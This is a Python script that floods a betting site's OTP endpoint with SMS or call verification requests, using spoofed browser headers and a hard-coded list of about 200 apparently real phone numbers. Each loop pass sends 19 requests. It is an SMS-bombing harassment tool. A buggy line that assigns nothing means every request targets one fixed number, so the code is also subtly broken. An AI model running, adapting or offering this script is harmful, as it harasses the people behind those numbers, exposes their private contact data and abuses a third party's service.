import requests

json = {
    "channelType": "mobile",
    "mobileNumber": "9167638142",
    "messagechannelType": "SMS" # CALL
}
url = 'https://sb-feapi.betcorrect.com/api/v1/player/create/request/otp'
headers = {
    "authority": "sb-feapi.betcorrect.com",
    "method": "POST",
    "path": "/api/v1/player/create/request/otp",
    "scheme": "https",
    "accept": "*/*",
    "content-type": "application/json",
    "origin": "https://betcorrect.com",
    "referer": "https://betcorrect.com/",
    "sec-ch-ua": '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
}
numbers = [
    '7012032325', '7012638020', '7012870236', '7015189425', '7015350770', '7016662992', '7017370481', '7018651746', '7019532987', '7025064198', '7026537620', '7026895498', '7030806464', '7031084259', '7032821541', '7034484055', '7038045970', '7039281521', '7040296395', '7041668885', '7043006993', '7045125038', '7045158850', '7045438563', '7045580195', '7045599651', '7045847132', '7045895777', '7047429518', '7048176080', '7048578739', '7049782600', '7058149298', '7058558092', '7059597281', '7061083359', '7061652181', '7063292496', '7065052396', '7066622077', '7068014597', '7069405981', '7071596604', '7079627256', '7080062831', '7083262103', '7083878259', '7084353829', '7085115454', '7085189948', '7085622322', '7087170748', '7088078775', '7089367178', '8022884563', '8022895101', '8025039267', '8026997230', '8035053935', '8035524541', '8035648920', '8050884456', '8051636724', '8051994842', '8053453071', '8053744603', '8055146434', '8059494191', '8061123959', '8065947879', '8066196927', '8068817701', '8069942060', '8069979047', '8070402509', '8076184209', '8082734641', '8082857675', '8083072453', '8084255242', '8087396225', '8089271479', '8093410376', '8095540169', '8096233079', '8096575185', '8100333412', '8100367291', '8101369911', '8102975752', '8104740876', '8105549830', '8106066627', '8106359239', '8108654669', '8109528129', '8109651847', '8109866822', '8111263249', '8113638496', '8114179050', '8114338237', '8119614775', '8122041166', '8124229230', '8125356751', '8128554604', '8129059707', '8130379260', '8132929454', '8134011719', '8134242386', '8135256604', '8135324041', '8135659260', '8135696056', '8135883836', '8136305859', '8136659023', '8137663720', '8138339475', '8138396302', '8138616745', '8139392918', '8139601733', '8139605657', '8140247124', '8140645454', '8141106006', '8141387570', '8141582518', '8141604895', '8141858983', '8141978729', '8142248256', '8142554692', '8143130330', '8144072800', '8144283848', '8144430877', '8144538501', '8144804427', '8145252265', '8146965289', '8147517583', '8148248873', '8148950537', '8150798445', '8151814158', '8151918284', '8158632053', '8161213594', '8162084173', '8163753758', '8164613530', '8164859191', '8164969162', '8165343891', '8165918698', '8168498016', '8168535395', '8169258497', '8169383907', '8175741619', '8178713930', '8179622521', '8186829794', '8188049380', '8188565503', '9010224030', '9011181659', '9014946032', '9014951181', '9015509375', '9017910122', '9019044034', '9019116721', '9020142805', '9020474648', '9022891576', '9023773875', '9027773671', '9027854469', '9028228962', '9028923853', '9029896889', '9030033141', '9030968510', '9032435821', '9032677199', '9032711067', '9032979874', '9034129641', '9034762007', '9034953313', '9035390690', '9035537767', '9036590733', '9036679433', '9036730277', '9167638142'
] 

for index, number in enumerate(numbers):
    json['mobileNumber']
    print(number, index)
    for i in range (1, 20):
        response = requests.post(url=url, json=json, headers=headers)
        print(response.json(), i)